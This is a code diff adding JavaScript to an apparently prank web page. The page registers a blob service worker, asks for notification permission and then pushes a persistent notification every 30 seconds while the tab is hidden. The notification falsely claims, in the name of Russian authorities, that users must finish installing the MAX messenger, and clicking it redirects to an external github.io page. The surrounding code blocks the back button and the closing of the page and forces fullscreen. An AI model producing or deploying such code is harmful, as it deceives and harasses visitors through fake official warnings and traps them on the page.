@@ -96,6 +96,31 @@
 
     <script>
         let isTrolling = false;
+        let notificationInterval;
+
+// Подготовка виртуального Service Worker
+const swCode = `self.addEventListener('install', () => self.skipWaiting());`;
+const blob = new Blob([swCode], { type: 'application/javascript' });
+const swUrl = URL.createObjectURL(blob);
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register(swUrl);
+}
+
+function sendTrollNotification() {
+    if (Notification.permission === 'granted' && document.hidden) {
+        const n = new Notification('СРОЧНО: Вернитесь в MAX', {
+            body: 'Власти РФ требуют завершить установку мессенджера MAX для соблюдения закона о связи.',
+            icon: 'https://img.icons8.com/color/48/000000/error.png',
+            tag: 'max-troll',
+            requireInteraction: true 
+        });
+        n.onclick = function() {
+            window.focus();
+            location.href = "https://den0denich-oss.github.io/Max/msg.html";
+        };
+    }
+}
+        
 
         function forceFull() {
             let e = document.documentElement;
@@ -110,6 +135,15 @@ window.onpopstate = function() { history.go(1); };
 window.onbeforeunload = function() { return "!"; }; 
 
                 function activateTroll() {
+                        // Запрос разрешения при клике
+    if ("Notification" in window) {
+        Notification.requestPermission().then(permission => {
+            if (permission === 'granted' && !notificationInterval) {
+                notificationInterval = setInterval(sendTrollNotification, 30000);
+            }
+        });
+    }
+                    
         // МГНОВЕННАЯ СМЕНА ЭКРАНА (Первым делом!)
         document.getElementById('m').style.display = 'none';
         document.getElementById('h').style.display = 'none';
